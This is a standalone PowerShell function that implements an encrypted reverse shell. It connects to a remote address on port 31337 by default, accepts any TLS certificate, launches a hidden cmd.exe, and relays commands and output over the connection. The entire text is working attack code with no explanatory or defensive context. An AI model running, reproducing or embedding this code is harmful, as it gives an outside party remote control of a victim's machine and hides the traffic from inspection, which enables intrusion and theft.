function rsh($address,$port=31337,$shell='cmd.exe',$parameters)
{
	$tcpclient = new-object net.sockets.tcpclient($address,$port)
	$tcpstream = $tcpclient.getstream()
	$tlsstream = new-object net.security.sslstream($tcpstream,$false,[net.security.remotecertificatevalidationcallback]{$true})
	$tlsstream.authenticateasclient(0)
	$tlsstreamwriter = new-object io.streamwriter($tlsstream)
	$tlsstreamwriter.autoflush = $true
	$tlsstreamreader = new-object io.streamreader($tlsstream)
	$shellinfo = new-object diagnostics.processstartinfo
	$shellinfo.filename = $shell
	$shellinfo.arguments = $parameters
	$shellinfo.createnowindow = $true
	$shellinfo.useshellexecute = $false
	$shellinfo.redirectstandardoutput = $true
	$shellinfo.redirectstandarderror = $true
	$shellinfo.redirectstandardinput = $true
	$shell = new-object diagnostics.process
	$shell.startinfo = $shellinfo
	$shell.start()
	$stdout = $shell.standardoutput
	$stderr = $shell.standarderror
	$stdin = $shell.standardinput
	while($stdout.peek() -gt -1)
	{
		$tlsstreamwriter.write([char]$stdout.read())
	}
	while(($shell.hasexited -eq $false))
	{
		do
		{
			$tlsstreamwriter.write([char]$stdout.read())
		}
		while($stdout.peek() -gt -1)
		$stdin.writeline($tlsstreamreader.readline())
		while($stdout.peek() -gt -1)
		{
			$tlsstreamwriter.write([char]$stdout.read())
		}
	}
}
